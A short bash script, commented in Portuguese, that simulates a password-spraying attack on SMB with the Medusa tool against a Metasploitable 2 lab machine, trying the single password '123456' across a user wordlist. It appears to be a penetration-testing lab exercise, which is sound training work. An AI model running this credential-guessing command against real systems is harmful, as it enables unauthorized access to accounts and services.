#!/bin/bash
# Script de Simulação de Password Spraying em SMB
# Ferramenta: Medusa
# Alvo: Metasploitable 2 (IP Fictício: 192.168.56.101)

echo "[*] Iniciando ataque de Password Spraying em SMB..."
echo "[*] Alvo: 192.168.56.101"
echo "[*] Lista de Usuários: ../wordlists/common_users.txt"
echo "[*] Senha Única (Spraying): 123456"

# Comando Medusa
# -h: Host
# -U: Lista de usuários (Note o U maiúsculo para lista)
# -p: Senha única (Note o p minúsculo para senha única)
# -M: Módulo (smbnt)

medusa -h 192.168.56.101 -U ../wordlists/common_users.txt -p "123456" -M smbnt

echo "[*] Ataque finalizado."
